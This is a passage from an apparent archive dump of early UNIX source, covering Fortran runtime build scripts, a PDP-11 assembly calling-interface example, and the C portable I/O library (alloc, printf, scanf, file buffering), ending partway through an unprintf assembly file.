as rd.s; mv a.out rd.o
as re.s; mv a.out re.o
as rf.s; mv a.out rf.o
as rg.s; mv a.out rg.o
as rh.s; mv a.out rh.o
as rx.s; mv a.out rx.o
ar r /lib/filib.a *.o
rm *.o

chdir ../rt1
as abs.s; mv a.out abs.o
as aimag.s; mv a.out aimag.o
as aint.s; mv a.out aint.o
as alog.s; mv a.out alog.o
as alog10.s; mv a.out alog10.o
as amax0.s; mv a.out amax0.o
as amax1.s; mv a.out amax1.o
as amin0.s; mv a.out amin0.o
as amin1.s; mv a.out amin1.o
as amod.s; mv a.out amod.o
as atan.s; mv a.out atan.o
as atan2.s; mv a.out atan2.o
as cabs.s; mv a.out cabs.o
fc -c ccos.f
as cexp.s; mv a.out cexp.o
fc -c clog.f
as cmplx.s; mv a.out cmplx.o
as conjg.s; mv a.out conjg.o
as cos.s; mv a.out cos.o
fc -c csin.f
fc -c csqrt.f
as dble.s; mv a.out dble.o
fc -c dccos.f
fc -c dclog.f
fc -c dcsin.f
fc -c dcsqrt.f
as dim.s; mv a.out dim.o
as dimag.s; mv a.out dimag.o
as exp.s; mv a.out exp.o
as float.s; mv a.out float.o
as iabs.s; mv a.out iabs.o
as idim.s; mv a.out idim.o
as idint.s; mv a.out idint.o
as ierr.s; mv a.out ierr.o
as ifix.s; mv a.out ifix.o
as isign.s; mv a.out isign.o
as mod.s; mv a.out mod.o
as real.s; mv a.out real.o
as sign.s; mv a.out sign.o
as sin.s; mv a.out sin.o
as sngl.s; mv a.out sngl.o
as sqrt.s; mv a.out sqrt.o
fc -c tanh.f
ar r /lib/libf.a *.o
rm *.o

chdir ../rt2
as ctime.s; mv a.out ctime.o
as getarg.s; mv a.out getarg.o
as nice.s; mv a.out nice.o
as rand.s; mv a.out rand.o
as setfil.s; mv a.out setfil.o
as uio.s; mv a.out uio.o
ar r /lib/libf.a
rm *.o
-- /usr/source/fort/sum.s mode=0100664 uid=3 gid=3 atime=174845097 mtime=174845097 --
/	example of UNIX fortran
/	calling interface to machine code
/	this example is a function that
/	returns the single precision 
/	sum of all of its single precision arguments.
/	for example:
/		f = sum(1.,2.,3.)
/	sets f to 6.

.globl	sum.				/ defination of entry
.globl	retrn				/ reference of return

sum.:					/ entry point
	value				/ location of return value
	.+2				/ pointer to execution code
	setf				/ no d/f i/l modes guaranteed
	mov	*2(sp),r0		/ arg count
	mov	r3,r1			/ r3 points to arg list
	tst	(r1)+			/ zeroth arg is old r3

	clrf	fr0			/ start of actual function
1:
	addf	*(r1)+,fr0		/ add in each argument
	sob	r0,1b			/ for each argument

	movf	fr0,value		/ make returned value available
	jmp	retrn			/ actual return

.bss
value:	.=.+4				/ space for return value

/ synopsis:
/	1. save registers r3, sp
/	2. arg list (pointers to values)
/	   begins at 2(r3)
/	3. entry name is name of function
/	   followed by "."
/	4. first word after entry point is
/	   location of return value. this is
/	   true for both functions and subroutines
/	5. second word after entry point is
/	   pointer to pdp-11 code body
/	6. return is expedited by a jump to
/	   the globl routine "retrn"
-- /usr/source/iolib mode=0140775 uid=3 gid=3 atime=174930098 mtime=174921378 --
-- /usr/source/iolib/alloc.c mode=0100664 uid=3 gid=3 atime=174921163 mtime=169260201 --
#
/*
 * C library -- alloc/free
 */

#define	logical	char *

struct fb {
	logical	size;
	char	*next;
};

int	freelist[] {
	0,
	-1,
};
logical	slop	2;

alloc(asize)
logical asize;
{
	register logical size;
	register logical np;
	register logical cp;

	if ((size = asize) == 0)
		return(0);
	size =+ 3;
	size =& ~01;
	for (;;) {
		for (cp=freelist; (np= cp->next) != -1; cp=np) {
			if (np->size>=size) {
				if (size+slop >= np->size) {
					cp->next = np->next;
					return(&np->next);
				}
				cp = cp->next = np+size;
				cp->size = np->size - size;
				cp->next = np->next;
				np->size = size;
				return(&np->next);
			}
		}
		asize = size<1024? 1024: size;
		if ((cp = sbrk(asize)) == -1) {
			return (-1);
		}
		cp->size = asize;
		free(&cp->next);
	}
}

free(aptr)
char *aptr;
{
	register logical ptr;
	register logical cp;
	register logical np;

	ptr = aptr-2;
	cp = freelist;
	while ((np = cp->next) < ptr)
		cp = np;
	if (ptr+ptr->size == np) {
		ptr->size =+ np->size;
		ptr->next = np->next;
		np = ptr;
	} else
		ptr->next = np;
	if (cp+cp->size == ptr) {
		cp->size =+ ptr->size;
		cp->next = ptr->next;
	} else
		cp->next = ptr;
}
-- /usr/source/iolib/calloc.c mode=0100664 uid=3 gid=3 atime=174921170 mtime=169260201 --
calloc(n, s)
{
return(alloc(n*s));
}
-- /usr/source/iolib/cclose.c mode=0100664 uid=3 gid=3 atime=174921175 mtime=169260201 --
# include "ciodec.c"
cclose (fn)
int fn;
{
struct fileps *fp;
extern char *IEH3olbf[10];
if (fn < 0 || fn > 20) return;
fp = &IEH3fpts[fn];
if (fp->nchars > 0 || fp->wrflag == 3)
	switch (fp->wrflag)
		{
		case 3: seek(fn,0,2);
		case 2: write (fn, fp->buff, fp->nchars);
			break;
		case 1: seek(fn, -(fp->nchars), 1);
		}
fp -> nchars = fp->eoferr = 0;
fp -> wrflag = 0;
if ( IEH3olbf[fn] != 0 && fp->bsize >4)
	free(IEH3olbf[fn]);
IEH3olbf[fn] = 0;
close (fn);
}
char *IEH3olbf[10] {0,0,0,0,0,0,0,0,0,0};
-- /usr/source/iolib/ceof.c mode=0100664 uid=3 gid=3 atime=174921181 mtime=169260201 --
# include "ciodec.c"
ceof (fn)
int fn;
{
struct fileps *fp;
fp = &IEH3fpts[fn];
if (fp->wrflag > 0 && fp->eoferr == 2)
	return(1);
else return(0);
}
cerr (fn)
int fn;
{
struct fileps *fp;
fp = &IEH3fpts[fn];
if (fp->eoferr == 0) fp->eoferr = 1;
if (fp->wrflag > 0 && fp->eoferr == 3)
	return(1);
else return(0);
}
-- /usr/source/iolib/cerror.c mode=0100664 uid=3 gid=3 atime=174921187 mtime=169260201 --
IEH3err (message, a, b, c, d, e)
char message[];
	{
	extern int cgoof;
	printf("ERROR ");
	printf(message, a, b, c, d, e);
	cputc('\n');
	cexit(cgoof);
	}
cgoof 127;
-- /usr/source/iolib/cexit.c mode=0100664 uid=3 gid=3 atime=174921192 mtime=169260201 --
cexit (rcode)
{
/* closes all files and exits */
int i;
for (i = 0; i < 10; i++)
	cclose(i);
exit(rcode);	/* rcode courtesy of sny */
}
-- /usr/source/iolib/cflush.c mode=0100664 uid=3 gid=3 atime=174921197 mtime=169260201 --
# include "ciodec.c"
cflush (fn)
int fn;
{
struct fileps *fp;
if (nargs() != 1)
	IEHzap("cflush");
if (fn < 0 || fn >15) return;
fp = &IEH3fpts[fn];
if (fp->nchars > 0 && fp->wrflag >= 2)
	{
	write (fn, fp->buff,fp->nchars);
	fp->bptr = fp->buff;
	fp -> nchars = fp->eoferr = 0;
	}
if (fp->wrflag == 1)
	seek(fn, -(fp->nchars),1);
return;
}
-- /usr/source/iolib/cfree.c mode=0100664 uid=3 gid=3 atime=174921203 mtime=169260201 --
cfree (ptr)
{
free(ptr);
}
-- /usr/source/iolib/cgetc.c mode=0100664 uid=3 gid=3 atime=174921207 mtime=169260201 --
# include "ciodec.c"
char cgetc(fn)
{
struct fileps *fp;
if (nargs() != 1)
	IEHzap("cgetc  ");
if (fn <0 || fn >15)
	IEH3err("cgetc: %d illegal file number",fn);
fp = &IEH3fpts[fn];
if (fp == 0 || fp->wrflag > 1)
	IEH3err("cgetc: %d not open to read",fn);
if (fp->wrflag == 0)
	/* file not opened with fopen: try making a buffer */
	IEH3mbuf (fn, 0);
if (fp->eoferr > 1)
	return ('\0');
if (fp->nchars == 0)
	 switch (fp->nchars = read(fn, fp->bptr=fp->buff, fp->bsize))
		{
		case -1: /* error */
			if (fp->eoferr == 0)
				IEH3err("cgetc: error on %d",fn);
			fp->eoferr = 3;
			return ('\0');
		case 0: fp->eoferr = 2;
			return ('\0');
		}
fp->nchars--;
return (*(fp->bptr++));
}
cin 0;
-- /usr/source/iolib/ciodec.c mode=0100664 uid=3 gid=3 atime=174921356 mtime=169260202 --
struct fileps
	{
	char *buff, *bptr;
	int nchars, bsize;
	char eoferr, wrflag;
	};
extern struct fileps IEH3fpts[10];
-- /usr/source/iolib/clenf.c mode=0100664 uid=3 gid=3 atime=174921219 mtime=169260202 --
_clenf (s) /* counts length of string */
char *s;
{
int n;
for (n=0; *s++ != '\0'; n++);
return (n);}
-- /usr/source/iolib/copen.c mode=0100664 uid=3 gid=3 atime=174921225 mtime=169260202 --
copen (filename, type)
char *filename;
int type;
{
int fn;
switch (type)
	{
	case 'r': type = 0;
	case 0:	  fn = open(filename,0);
		break;
	case 'a': type = 2;
	case 2:	if ((fn=open(filename,1))>=0)
			break;	/* courtesy of sny */
	/* append defaults to write if file missing */
	case 'w': type = 1;
	case 1: fn = creat(filename,0666);
		break;
	default: IEH3err("copen: bad file %s",filename);
	}
if (fn >= 0)
	IEH3mbuf(fn,type);
return(fn);
}
-- /usr/source/iolib/cputc.c mode=0100664 uid=3 gid=3 atime=174921229 mtime=169260202 --
# include "ciodec.c"
char cputc(ch, fn)
{
struct fileps *fp;
if (nargs() != 2)
  IEHzap("cputc  ");
if (fn<0 || fn>20) return(ch);
fp = &IEH3fpts[fn];
if (fp->wrflag == 1)
	IEH3err("cputc: %d not open",fn);
if (fp->wrflag == 0)
	IEH3mbuf(fn,1);
*(fp->bptr++) = ch;
if (++(fp->nchars) < fp->bsize)
	return(ch);
if (fp->wrflag == 3) /* append, seek to end */
	{
	seek(fn, 0, 2);
	fp->wrflag = 2; /* now just write from here on */
	}
if ( write(fn, fp->bptr=fp->buff, fp->nchars) < 0)
	{
	if (fp->eoferr == 0)
		IEH3err("cputc: writing %d",fn);
	fp->eoferr = 3;
	}
fp->nchars = 0;
return (ch);
}
cout 1;
-- /usr/source/iolib/cwrd.c mode=0100664 uid=3 gid=3 atime=174921237 mtime=169260202 --
cwrite (buff, buffp1, len, fn)
char *buff, *buffp1; int len, fn;
{
int unit, nwr;
unit = buffp1-buff;
len =* unit;
nwr = write (fn, buff, len);
return (nwr < 0 ? -1 : nwr/unit);
}
cread (buff, buffp1, len, fn)
char *buff, *buffp1; int len, fn;
{
int unit, nrd;
unit = buffp1 - buff;
len =* unit;
nrd = read(fn, buff, len);
return (nrd < 0 ? -1 : nrd/unit);
}
-- /usr/source/iolib/dummy.s mode=0100664 uid=3 gid=3 atime=174921241 mtime=169260202 --
.globl	ndigit
.globl	_ieh305i
ndigit:	.=.+2
_ieh305i:	.=.+2
-- /usr/source/iolib/ftoa.c mode=0100664 uid=3 gid=3 atime=174921244 mtime=169260202 --
ftoa (x, str, prec, format)
float x;
char *str;
{
/* converts a floating point number to an ascii string */
/* x is stored into str, which should be at least 30 chars long */
int ie, i, k, ndig, fstyle;
double y;
if (nargs() != 7)
  IEHzap("ftoa  ");
ndig = ( prec<=0) ? 7 : (prec > 22 ? 23 : prec+1);
if  (format == 'f' || format == 'F')
 fstyle = 1;
else
 fstyle = 0;
/* print in e format unless last arg is 'f' */
ie = 0;
/* if x negative, write minus and reverse */
if ( x < 0)
  {
  *str++ = '-';
  x = -x;
  }

/* put x in range 1 <= x < 10 */
if (x > 0.0) while (x < 1.0)
  {
  x =* 10.0;
  ie--;
  }
while (x >= 10.0)
  {
  x = x/10.0;
  ie++;
  }

/* in f format, number of digits is related to size */
if (fstyle) ndig =+ ie;

/* round. x is between 1 and 10 and ndig will be printed to
   right of decimal point so rounding is ... */
for (y = i = 1; i < ndig; i++)
  y = y/10.;
x =+ y/2.;
if (x >= 10.0) {x = 1.0; ie++;} /* repair rounding disasters */
/* now loop.  put out a digit (obtain by multiplying by
  10, truncating, subtracting) until enough digits out */
/* if fstyle, and leading zeros, they go out special */
if (fstyle && ie<0)
  {
  *str++ = '0'; *str++ = '.';
  if (ndig < 0) ie = ie-ndig; /* limit zeros if underflow */
  for (i = -1; i > ie; i--)
    *str++ = '0';
  }
for (i=0; i < ndig; i++)
  {
  k = x;
  *str++ = k + '0';
  if (i == (fstyle ? ie : 0)) /* where is decimal point */
    *str++ = '.';
  x =- (y=k);
  x =* 10.0;
  }

/* now, in estyle,  put out exponent if not zero */
if (!fstyle && ie != 0)
  {
  *str++ = 'E';
  if (ie < 0)
    {
    ie = -ie;
    *str++ = '-';
    }
  for (k=100; k > ie; k =/10);
  for (; k > 0; k =/10)
       {
       *str++ = ie/k + '0';
       ie = ie%k;
       }
  }
*str = '\0';
return;
}
-- /usr/source/iolib/getch.c mode=0100664 uid=3 gid=3 atime=174921251 mtime=169260202 --
getchar()
{
extern cin;
return (cgetc(cin));
}
-- /usr/source/iolib/gets.c mode=0100664 uid=3 gid=3 atime=174921256 mtime=169260202 --
gets (s)
char *s;
{ /* gets (s) - read a string with cgetc and store in s */
char *p;
extern int cin;
if (nargs () == 2)
	IEHzap("gets  ");
p=s;
while ((*s = cgetc(cin)) != '\n' && *s != '\0') s++;
if (*p == '\0') return (0);
*s = '\0';
return (p);
}
-- /usr/source/iolib/getvec.c mode=0100664 uid=3 gid=3 atime=174921262 mtime=169260202 --
getvec (n)
{
return (alloc(n));
}
-- /usr/source/iolib/iehzap.c mode=0100664 uid=3 gid=3 atime=174921267 mtime=169260202 --
IEHzap(s)
{
write(2,s,6);
write(2,": argument count wrong\n",23);
write(2,"That's all, folks\n",18);
exit();
}
-- /usr/source/iolib/makbuf.c mode=0100664 uid=3 gid=3 atime=174921271 mtime=169260202 --
# include "ciodec.c"
IEH3bsz 512;
IEH3mbuf (fn, type)
int fn, type;
{
struct fileps *fp;
extern char *IEH3olbf[], *alloc();
extern int IEHfbak[10];
int bx[19], size, bloc;
fp = &IEH3fpts[fn];
fp->eoferr = fp->nchars = 0;
fp->wrflag = type+1;
/* decide whether to buffer or not */
if (ttyn(fn) != 'x')
	size = 1;
else
if (fstat(fn,bx) > 0 && bx[0] == 40 && type == 0)
	size = 1;
else
	size = IEH3bsz;
for (fp->buff = 0; size >10 && fp->buff == 0; size =/ 4)
		if ((bloc = alloc(size+100)) != -1)
			{
			IEH3olbf[fn] = bloc;
			fp->buff = fp->bptr =bloc + 100;
			fp->bsize = size;
			break;
			}
if (fp->buff == 0)
	{
	fp->buff = fp->bptr = &IEHfbak[fn];
	fp->bsize = size>1 ? 2 : 1;
	}
}
struct fileps IEH3fpts [10];
int IEHfbak[10];
-- /usr/source/iolib/maktab.c mode=0100664 uid=3 gid=3 atime=174921278 mtime=169260202 --
char IEH3endm[128] {0};
IEH3mtab (formatp)
char **formatp;
{
/* make up special table of string ending characters */
int i, normal;
char ch;
/* normally all characters end string except those listed */
normal = 1;
if (**formatp == '^')
	{normal = 0; (*formatp)++;}
for (i= 0; i < 128; i++)
	IEH3endm[i] = normal;
while ((ch = *((*formatp)++)) != ']')
	IEH3endm[ch] = !IEH3endm[ch];

}
-- /usr/source/iolib/nexch.c mode=0100664 uid=3 gid=3 atime=174921284 mtime=169260202 --
IEH3nxch ()
/* returns next character which is not IEH3spce */
{
	char ch, cgetc();
	extern int IEH3sfil;
while ((ch = cgetc(IEH3sfil)) > 0 && IEH3spce(ch));
if  (ch > 0)
	return (ch);
return (-1);
}
-- /usr/source/iolib/nodig.c mode=0100664 uid=3 gid=3 atime=174921289 mtime=169260202 --
IEH3nodg (ch)
char ch;
{
if (IEH3digt(ch)) return (0);
switch (ch)
	{
	case 'E':
	case 'e':
	case '.': case '+': case '-':
		return (0);
	}
return (1);
}
-- /usr/source/iolib/printf.c mode=0100664 uid=3 gid=3 atime=174921294 mtime=169260202 --
char  *_ptrbf, *_ptrst, *__fmt;
printf(a1,a2,a3,a4){
auto char  c, *s,  adj, *ptr,*p, buf[30];
extern cputc(),_putstr(), cout;
auto int  *adx, x, n, m, width, prec,i, padchar, fd;
double zz, *dblptr;
char (*f)();
_ptrbf = buf;

fd=cout;
adx = &a1;
f = cputc;
if (a1 == -1)
  {
  f = _putstr;
  _ptrst = a2;
  adx =+ 2;
  }
else if (a1 >= 0 && a1 <= 9)
  fd = *adx++;
__fmt = *adx++;


while( c = *__fmt++ ){
   if(c != '%') (*f)(c,fd);
   else { x = *adx++;
      if( *__fmt == '-' ){ adj = 'l';  __fmt++; }
      else adj = 'r';
   padchar = (*__fmt=='0') ? '0' : ' ';
      width = __conv();
      if( *__fmt == '.'){++__fmt; prec = __conv();}
      else prec = 0;

   s = 0;
   switch ( c = *__fmt++ ) {
     case 'D':
     case 'd':
	_prt1(x); break;
     case 'o':
     case 'O':
         _prnt8(x); break;
     case 'x':
     case 'X':
          _prntx(x); break;
      case 'S':
     case 's':    s=x;
        break;
     case 'C':
     case 'c':   *_ptrbf++ = x&0777;
         break;
     case 'E':
     case 'e':
     case 'F':
     case 'f':
      dblptr = adx-1;
      zz = *dblptr;
      adx =+ 3;
      ftoa (zz, buf, prec, c);
      prec = 0;
      s = buf;
     break;
     default:   (*f)(c,fd);
         adx--;
   }
   if (s == 0)
    {*_ptrbf = '\0'; s = buf;}
   n = _clenf (s);
   n = (prec<n && prec != 0) ? prec : n;
   m = width-n;
   if (adj == 'r') while (m-- > 0) (*f)(padchar,fd);
   while (n--) (*f)(*s++,fd);
   while (m-- > 0) (*f)(padchar,fd);
   _ptrbf = buf;
   }
}
if(a1 == -1) (*f)('\0',fd);
}


_prnt8 (n)
{ /* print in octal */
int p, k, sw;
if (n==0) {*_ptrbf++ = '0'; return;}
sw = 0;
for (p=15; p >= 0; p =- 3)
  if ((k = (n>>p)&07) || sw)
   {
    *_ptrbf++ = '0' + k;
     sw = 1;
     }
}
_prntx (n)
{
	int d,a;
	if (a = n>>4)
		_prntx ( a & 07777);
	d = n&017;
	*_ptrbf++ =  d > 9 ? 'A'+d-10 : '0' + d;
}

__conv()
{
auto c,n;
n = 0;
while( ((c = *__fmt++) >= '0') && (c<='9')) n = n*10+c-'0';
__fmt--;
return(n);
}

_putstr(chr,str){
*_ptrst++ = chr;
return; ieh305i(); /* force loading of dummy.s */
}
_prt1(n)
{
int digs[15], *dpt;
dpt = digs;
if (n >= 0)
   n = -n;
else
   *_ptrbf++ = '-';
for (; n != 0; n = n/10)
 *dpt++ = n%10;
if (dpt == digs)
   *dpt++ = 0;
while (dpt != digs)
   { --dpt;
   *_ptrbf++ =  '0' - *dpt;
}
}
-- /usr/source/iolib/putch.c mode=0100664 uid=3 gid=3 atime=174921303 mtime=169260202 --
putchar (c)
char c;
{
extern cout;
cputc(c,cout);
}
-- /usr/source/iolib/puts.c mode=0100664 uid=3 gid=3 atime=174921308 mtime=169260202 --
puts(str)
char *str;
{
auto char *p,c;
auto int f;
extern int cout;
if (nargs() != 1)
   IEHzap("puts  ");
p = str;
while( (c = *p++)!= '\0') cputc(c,cout);
cputc('\n',cout);
return(str);
}
-- /usr/source/iolib/relvec.c mode=0100664 uid=3 gid=3 atime=174921313 mtime=169260202 --
relvec (ptr)
{
free(ptr);
}
-- /usr/source/iolib/revput.c mode=0100664 uid=3 gid=3 atime=174921317 mtime=169260202 --
# define bufflen 100
IEH3revp (c)
char c;
{
/* reversed line IEH3outputter */
extern char *IEH3outp, *IEH3outlim;
*IEH3outp++ = c;
if (IEH3outp > IEH3outlim+100)
	IEH3err("unprint producing too many chars");
}
-- /usr/source/iolib/run mode=0100664 uid=3 gid=3 atime=174921377 mtime=174917273 --
cc -c -O alloc.c
cc -c -O calloc.c
cc -c -O cclose.c
cc -c -O ceof.c
cc -c -O cerror.c
cc -c -O cexit.c
cc -c -O cflush.c
cc -c -O cfree.c
cc -c -O cgetc.c
cc -c -O ciodec.c
cc -c -O clenf.c
cc -c -O copen.c
cc -c -O cputc.c
cc -c -O cwrd.c
as dummy.s; mv a.out dummy.o
cc -c -f -O ftoa.c
cc -c -O getch.c
cc -c -O gets.c
cc -c -O getvec.c
cc -c -O iehzap.c
cc -c -O makbuf.c
cc -c -O maktab.c
cc -c -O nexch.c
cc -c -O nodig.c
cc -c -O printf.c
cc -c -O putch.c
cc -c -O puts.c
cc -c -O relvec.c
cc -c -O revput.c
cc -c -O scan1.c
cc -c -O scan2.c
cc -c -O scan3.c
cc -c -O system.c
cc -c -O tmpnam.c
cc -c -O unget.c
as unprnt.s; mv a.out unprnt.o
cc -c -O wdleng.c
ar r /lib/libp.a *.o
rm *.o
-- /usr/source/iolib/scan1.c mode=0100664 uid=3 gid=3 atime=174921324 mtime=169260203 --
scanf (p1, p2, p3, p4)
	int p1, p2, p3, p4;
{
/* first arg can be a control string, a file id, or -1 */
	int ptrs[10], j, ip, flp, k;
	char *np;
/*	extern int cin;*/
extern (*_Igetc)(), (*_Iungc)(), cgetc(), ungetc(), _Igstr(), _Iungs();
extern char *_Iinpt;
ip = 0;
if (p1 == -1)
  {k = 1; _Iinpt = p2;}
else if (p1 >= 0 && p1 < 10)
  k = 0;
else
  k = -1;
if (k <= 0)
  {_Igetc = cgetc; _Iungc = ungetc;}
else
  {_Igetc = _Igstr; _Iungc = _Iungs;}
j = 0;
for (np = (&p2)[k]; *np; np++)
    if (*np == '%' && *(np+1) != '%' && *(np+1) != '*')
	ptrs[ip++] = (&p3)[(j++)+k];
return (_Iscan ((k==0 ?  p1 : 0), (&p2)[k], ptrs));
}

_Iscan (fileid, format, listp)
	char *format;
	int *listp;
{
	char ch, _Inxch();
	int nmatch;
	extern int _Isfil;
	_Isfil = fileid;
nmatch = 0;
while (1) switch (ch= *format++)
	{
	case '\0': return (nmatch);
	case '%': switch (_Isfrm(&format, *listp++))
			{
			case 0: listp--; break;
			case -1: return (nmatch > 0 ? nmatch : -1);
			default: nmatch++;
			}
	case ' ':
	case '\n':
	case '\t': break;
	default: if (ch != _Inxch())
			return(nmatch);
	}
}

int _Isfil 0;

_Ichar (cptr)
	char *cptr;
{
	char ch, _Inxch();

if ((ch = _Inxch()) < 0)
	return (-1);
if (cptr == 0)
	return (0);
*cptr = ch;
return (1);
}

_Iflot (fptr, length)
	float *fptr;
	int length;
{
	char temp[75];
	int _Inodg();
	float x;
	double atof();

if (_Isstr(temp, length, _Inodg) < 0)
	return (-1);
x = atof(temp);
if (fptr == 0)
	return (0);
*fptr = x;
return (1);
}

_Inodg (ch)
char ch;
{
if (_Idigt(ch,10) >= 0) return (0);
switch (ch)
	{
	case 'E':
	case 'e':
	case '.': case '+': case '-':
		return (0);
	}
return (1);
}

_Isfrm (spec, pointer)
	char **spec;
	int pointer;
{
	int length, lflag, _Iestr(), _Ispnd();
	char ch;
length = lflag = 0;
while (1) switch (ch = *((*spec)++))
	{
	case '*': pointer=0; break;
	case '0': case '1': case '2': case '3': case '4':
	case '5': case '6': case '7': case '8': case '9':
		length = length*10 + ch - '0' ;
		lflag++;
		break;
	case 'o': /* octal */
		return(_Iint(pointer, lflag ? length : 100, 8));
	case 'x': /* hex */
		return(_Iint(pointer, lflag ? length : 100, 16));
	case 'd': /* decimal */
		return (_Iint(pointer, lflag ? length : 100, 10));
	case 'c': /* character */
		return (_Ichar(pointer));
	case 's': /* string */
		return (_Isstr(pointer, lflag ? length : 100, _Iestr));
	case 'f':
	case 'e': /* float */
		return (_Iflot(pointer, lflag ? length : 100));
	case 'l': /*  (long) double or int */
		switch(*(*spec)++)
			{
			case 'f': case 'F':
			case 'e': case 'E':
				return (_Ilong (pointer, lflag ? length : 100));
			default: printf(2, "long not yet implemented\n");
				return(0);
			}
	case '[': /* special strings */
		_Imtab(spec);
		return (_Isstr (pointer, lflag ? length : 100, _Ispnd));
	case '%':
		if (_Inxch() != '%')
			return (-1);
		return(0);
	case '\0':
		_Ierr("scanf: bad format termination\n");
	default: _Ierr ("scanf: format character %c", ch);
	}
}
-- /usr/source/iolib/scan2.c mode=0100664 uid=3 gid=3 atime=174921333 mtime=169260203 --
_Iint (iptr, length, numbase)
	int *iptr, length;
{
	int n, minus, numdig;
	extern int _Isfil, (*_Iungc)(), (*_Igetc)();
	int c, dval;

n = minus = numdig = 0;
switch ((c=_Inxch()))
	{
	case '-': minus = 1;
	case '+': break;
	default: (*_Iungc)(c,_Isfil);
	}
while ((dval=_Idigt(c=((*_Igetc)(_Isfil)), numbase ) ) >= 0 && numdig++ < length)
	n = n*numbase + dval;
(*_Iungc)(c,_Isfil);
if (numdig == 0)
	return (-1);
if (iptr == 0)
	return (0);
*iptr = minus ? -n : n;
return (1);
}

_Idigt (x, base)
{
switch (x)
	{
	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
		return(x-'0');
	case '8':
	case '9':
		if (base > 8)
			return(x - '0');
	case 'a':
	case 'b':
	case 'c':
	case 'd':
	case 'e':
	case 'f':
		if (base >10)
			return(x - 'a' + 10);
	case 'A':
	case 'B':
	case 'C':
	case 'D':
	case 'E':
	case 'F':
		if (base > 10)
			return(x-'A' + 10);
	}
return(-1);
}

_Ilong (dptr, length)
	double *dptr;
	int length;
{
	char temp[75];
	int _Inodg();
	double x;
	double atof();

if (_Isstr(temp, length, _Inodg) < 0)
	return (-1);
x = atof(temp);
if (dptr == 0)
	return (0);
*dptr = x;
return (1);
}

_Isstr (sptr, length, stopf)
	char *sptr;
	int length, (*stopf)();
{
	int ch, initlen, _Inxch();
	extern int _Isfil, (*_Igetc)(), (*_Iungc)();

initlen = length;
if ((ch=_Inxch()) < 0)
	return (-1);
(*_Iungc)(ch,_Isfil);
while (!((*stopf)(ch=(*_Igetc)(_Isfil))) && length-- > 0)
	if (sptr != 0)
		*(sptr++) = ch;
if (ch >= 0)
	(*_Iungc)(ch,_Isfil);
if (length == initlen)
	return (-1);
if (sptr == 0)
	return (0);
*sptr = '\0';
return (1);
}

_Iestr (c)
char c;
{
if (_Ispce(c)) return (1);
if (c == '\0') return (1);
return (0);
}
-- /usr/source/iolib/scan3.c mode=0100664 uid=3 gid=3 atime=174921340 mtime=169260203 --
_Ierr (message, a, b, c, d, e)
char message[];
	{
	extern int cgoof;
	printf("ERROR ");
	printf(message, a, b, c, d, e);
	cputc('\n');
	cexit(cgoof);
	}
char _Iendm[128] {0};
_Imtab (formatp)
char **formatp;
{
/* make up special table of string ending characters */
int i, normal;
char ch;
/* normally all characters end string except those listed */
normal = 1;
if (**formatp == '^')
	{normal = 0; (*formatp)++;}
for (i= 0; i < 128; i++)
	_Iendm[i] = normal;
while ((ch = *((*formatp)++)) != ']')
	_Iendm[ch] = !_Iendm[ch];

}

_Inxch ()
/* returns next character which is not _Ispce */
{
	extern int _Isfil, (*_Igetc)();
        int ch;
while ((ch = (*_Igetc)(_Isfil)) > 0 && _Ispce(ch));
if  (ch > 0)
	return (ch);
return (-1);
}

_Ispce (c)
char c;
{
switch (c)
	{
	case ' ':
	case '\n':
	case '\t': return(1);
	}
return(0);
}

_Ispnd (ch)
char ch;
{
return (_Iendm[ch] > 0);
}

char *_Iinpt;
int (*_Igetc)(), (*_Iungc)();
_Igstr ()
{
extern char *_Iinpt;
return (*_Iinpt++);
}

_Iungs(ch)
{
extern char *_Iinpt;
*--_Iinpt = ch;
}
-- /usr/source/iolib/system.c mode=0100664 uid=3 gid=3 atime=174921347 mtime=169260203 --
system(str)
 char *str;
{
int status;
  if(fork() == 0)
    execl("/bin/sh", "sh", "-c", str, 0);
  wait(&status);
  }
-- /usr/source/iolib/tmpnam.c mode=0100664 uid=3 gid=3 atime=174921352 mtime=169260203 --
int IEH0958g 0;
tmpnam(s)
	char *s;
{
printf(-1,s,"pl%d%c",getpid(),'a'+IEH0958g++);
return(s);
}
-- /usr/source/iolib/unget.c mode=0100664 uid=3 gid=3 atime=174921356 mtime=169260203 --
# include "ciodec.c"
ungetc (c, fn)
{
struct fileps *fp;
if (nargs() != 2)
   IEHzap("ungetc");
/* push back onto input */
fp = &IEH3fpts[fn];
if (fp->wrflag == 0)
	IEH3mbuf(fn,0);
if (fp->bptr <= fp->buff - 100)
	IEH3err("ungetc/unprintf: buffer full file %d",fn);
*--fp->bptr = c;
fp->nchars++;
}
-- /usr/source/iolib/unprnt.s mode=0100664 uid=3 gid=3 atime=174921362 mtime=169260203 --
/ C library -- unprintf


.globl	_unprintf
.globl	ndigix

.globl	pfloat
.globl	pscien
.globl	_IEH3revp
.globl	_IEH3bcko

_unprintf:
	mov	r5,-(sp)
	mov	sp,r5
	mov	4(r5),formp		/ format
	mov	r5,r4
	add	$6,r4			/ arglist
	sub	$128.,sp		/ buffer
loop:
	movb	*formp,r0
	beq	1f
	inc	formp
	cmp	r0,$'%
	beq	2f
3:
	mov	r4,-(sp)
	mov	r0,-(sp)
	jsr	pc,*$_IEH3revp
	tst	(sp)+
	mov	(sp)+,r4
	br	loop
1:
	add	$128.,sp
	mov	(sp)+,r5
	jsr	pc,_IEH3bcko
	rts	pc
2:
	clr	rjust
	clr	ndigix
	cmpb	*formp,$'-
	bne	2f
	inc	formp
	inc	rjust
2:
	jsr	r3,gnum; width
	clr	ndfnd
	cmp	r0,$'.
	bne	1f
	jsr	r3,gnum; ndigix
1:
	mov	sp,r3
	mov	$swtab,r1
1:
	mov	(r1)+,r2
	beq	3b
	cmp	r0,(r1)+
	bne	1b
	jmp	(r2)
swtab:
	decimal;	'd
	octal;		'o
	float;		'f
	scien;		'e
	charac;		'c
	string;		's
	logical;	'l
	0;  0

decimal:
	mov	(r4)+,r1
	bge	1f
	neg	r1
	movb	$'-,(r3)+
	br	1f

logical:
	mov	(r4)+,r1
1:
	jsr	pc,1f
	br	prbuf
1:
	clr	r0
	div	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,r0
	add	$'0,r0
	movb	r0,(r3)+
	rts	pc

charac:
	movb	(r4)+,(r3)+
	bne	1f
	dec	r3
1:
	movb	(r4)+,(r3)+
	br	prbuf

string:
	mov	ndigix,r1
1:
	mov	(r4)+,r2
1:
	movb	(r2)+,(r3)+
	beq	prbuf
	sob	r1,1b
	br	prbuf

octal:
